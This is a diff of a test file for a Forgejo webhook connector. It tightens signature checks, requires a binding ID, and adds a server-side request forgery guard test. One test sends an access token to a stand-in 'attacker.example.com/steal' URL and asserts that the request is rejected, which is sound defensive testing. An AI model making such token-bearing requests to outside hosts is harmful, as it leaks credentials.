@@ -15,13 +15,14 @@ pipeline default() {
   assert_eq(provider_id(), "forgejo", "provider id")
   assert_eq(kinds()[0], "webhook", "first kind")
   assert_eq(payload_schema().harn_schema_name, "ForgejoEventPayload", "schema")
+  // Seed the signing secret via init/activate — never via inbound `raw.*` fields.
   init({signing_secret: "secret"})
   let activated = activate([{id: "primary", path: "/hooks/forgejo", secrets: {signing_secret: "secret"}}])
   assert_eq(activated.bindings, 1, "activation count")
   let body = "{\"action\":\"opened\",\"repository\":{\"full_name\":\"acme/widgets\",\"html_url\":\"https://codeberg.org/acme/widgets\"},\"sender\":{\"login\":\"ada\"},\"pull_request\":{\"number\":42,\"title\":\"Improve widgets\"}}"
   let headers = {"x-gitea-event": "pull_request", "x-gitea-delivery": "delivery-1"}
   let signature = "sha256=" + hmac_sha256("secret", body)
-  let raw = {signing_secret: "secret", body_text: body, headers: headers + {"x-gitea-signature": signature}}
+  let raw = {binding_id: "primary", body_text: body, headers: headers + {"x-gitea-signature": signature}}
   let normalized = normalize_inbound(raw)
   assert_eq(normalized.type, "event", "envelope type")
   assert_eq(normalized.event.kind, "pull_request.opened", "event kind")
@@ -29,24 +30,51 @@ pipeline default() {
   assert(normalized.event.dedupe_key != nil && normalized.event.dedupe_key != "", "dedupe key")
   let raw_hex = normalize_inbound(
     {
-      signing_secret: "secret",
+      binding_id: "primary",
       body_text: body,
       headers: headers + {"x-gitea-signature": hmac_sha256("secret", body)},
     },
   )
   assert_eq(raw_hex.event.signature_status.state, "verified", "raw-hex signature accepted")
   let bad_signature = normalize_inbound(
-    {signing_secret: "secret", body_text: body, headers: headers + {"x-gitea-signature": "sha256=00"}},
+    {binding_id: "primary", body_text: body, headers: headers + {"x-gitea-signature": "sha256=00"}},
   )
   assert_eq(bad_signature.type, "reject", "bad signature rejects")
   assert_eq(bad_signature.reject.status, 401, "bad signature status")
-  let missing_signature = normalize_inbound({signing_secret: "secret", body_text: body, headers: headers})
+  let missing_signature = normalize_inbound({binding_id: "primary", body_text: body, headers: headers})
   assert_eq(missing_signature.type, "reject", "missing signature rejects")
   assert_eq(missing_signature.reject.status, 401, "missing signature status")
-  let invalid_json = normalize_inbound({body_text: "{bad json", headers: headers})
+  let invalid_json = normalize_inbound(
+    {
+      binding_id: "primary",
+      body_text: "{bad json",
+      headers: headers + {"x-gitea-signature": "sha256=" + hmac_sha256("secret", "{bad json")},
+    },
+  )
   assert_eq(invalid_json.type, "reject", "invalid json rejects")
-  let unsupported = normalize_inbound({body_text: "{}", headers: {"x-gitea-event": "deploy_key"}})
+  let unsupported = normalize_inbound(
+    {
+      binding_id: "primary",
+      body_text: "{}",
+      headers: {"x-gitea-event": "deploy_key", "x-gitea-signature": "sha256=" + hmac_sha256("secret", "{}")},
+    },
+  )
   assert_eq(unsupported.type, "reject", "unsupported event rejects")
+  // F8: missing binding_id is fail-closed.
+  let no_binding = normalize_inbound({body_text: body, headers: headers + {"x-gitea-signature": signature}})
+  assert_eq(no_binding.type, "reject", "missing binding_id rejects")
+  assert_eq(no_binding.reject.status, 400, "missing binding_id 400")
+  // F1: absolute-URL path in api.request is rejected (SSRF guard).
+  let ssrf = call(
+    "api.request",
+    {
+      api_base_url: "https://codeberg.org/api/v1",
+      path: "https://attacker.example.com/steal",
+      access_token: "token",
+      rate_limit: {disabled: true},
+    },
+  )
+  assert(is_err(ssrf), "absolute URL path rejected")
   http_mock_clear()
   http_mock(
     "GET",
